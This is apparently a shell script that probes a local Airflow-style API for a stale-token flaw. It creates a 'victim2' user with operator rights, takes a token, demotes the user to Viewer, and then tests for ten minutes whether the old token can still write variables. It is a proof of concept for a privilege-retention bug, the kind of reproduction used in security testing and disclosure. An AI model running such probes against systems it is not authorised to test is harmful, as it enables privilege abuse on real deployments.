#!/bin/zsh
set -u
H=http://localhost:8082
tk() { curl -s -X POST $H/auth/token -H 'Content-Type: application/json' -d "{\"username\":\"$1\",\"password\":\"$2\"}" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token',''))"; }
post() { curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: Bearer $1" -H 'Content-Type: application/json' $H/api/v2/variables -d "{\"key\":\"$2\",\"value\":\"1\",\"description\":\"\"}"; }
AT=$(tk admin adminpass)
curl -s -o /dev/null -X DELETE -H "Authorization: Bearer $AT" $H/auth/fab/v1/users/victim2
curl -s -o /dev/null -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' $H/auth/fab/v1/users \
  -d '{"username":"victim2","password":"victimpass","email":"v2@x.com","first_name":"v","last_name":"2","roles":[{"name":"Op"}]}'
VT=$(tk victim2 victimpass)
print -r -- "$(date +%H:%M:%S) source stale-token: $(post $VT t_src_$RANDOM)"
curl -s -o /dev/null -X PATCH -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' $H/auth/fab/v1/users/victim2 -d '{"roles":[{"name":"Viewer"}]}'
print -r -- "$(date +%H:%M:%S) transition done, roles=Viewer"
for i in $(seq 1 20); do
  sleep 30
  print -r -- "$(date +%H:%M:%S) +$((i*30))s stale=$(post $VT t_f${i}_$RANDOM) fresh=$(post $(tk victim2 victimpass) t_n${i}_$RANDOM)"
done
